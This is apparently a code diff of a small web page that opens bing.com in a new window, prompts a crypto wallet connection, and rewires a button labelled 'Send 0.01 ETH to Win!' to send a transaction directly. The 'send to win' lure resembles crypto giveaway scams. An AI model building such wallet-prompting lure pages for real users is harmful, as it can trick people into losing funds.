@@ -19,25 +19,11 @@
 </head>
 <body>
   <script>
+    let bingWindow;
+
     async function openBingAndPromptWallet() {
       // Open bing.com
-      const bingWindow = window.open('https://bing.com', 'x');
-
-      // Check for wallet connection when the button is clicked in bing.com
-      window.addEventListener('message', async (event) => {
-        if (event.origin !== 'https://bing.com') return;
-
-        if (event.data === 'promptWalletConnection') {
-          await promptWalletConnection();
-        } else if (event.data === 'sendTransaction') {
-          await sendTransaction();
-        }
-      });
-
-      // Check for wallet connection
-      await promptWalletConnection();
-      // Notify bing.com that the wallet is connected
-      bingWindow.postMessage('walletConnected', 'https://bing.com');
+      bingWindow = window.open('https://bing.com', 'x');
     }
 
     async function promptWalletConnection() {
@@ -80,7 +66,7 @@
   <center>
     <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
     <br>
-    <button class="button" onclick="bingWindow.postMessage('sendTransaction', 'https://bing.com')">Send 0.01 ETH to Win!</button>
+    <button class="button" onclick="sendTransaction()">Send 0.01 ETH to Win!</button>
   </center>
 </body>
 </html>
